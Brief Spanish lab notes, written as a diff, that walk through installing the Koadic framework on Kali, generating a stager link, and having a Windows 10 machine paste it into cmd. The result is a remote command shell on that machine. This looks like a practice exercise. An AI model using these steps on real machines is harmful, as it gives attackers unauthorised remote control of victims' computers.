@@ -1,0 +1,21 @@
+++ PC1: Kali
+++ PC2: Windows 10
+
+
+++ PC1: sudo apt install koadic
+--- URL (información extra): https://www.kali.org/tools/koadic/
+++ PC1: koadic 
+++ PC1: help
+++ PC1: info 
+++ PC1: run 
+++ PC1: Enviar link generado a PC2
+++ PC2: Pegar link en cmd y dar enter
+++ PC1: Ya se tiene control sobre PC2
+++ PC1: sessions (Muestra las sesiones activas)
+++ PC1: cmdshell 1
+++ PC1: En este punto ya podemos ejecutar comandos para interactuar con el cmd del windows, tales como:
+--- dir (Listar directorios)
+--- cd <directorio> (Navegar a un directorio)
+
+
+
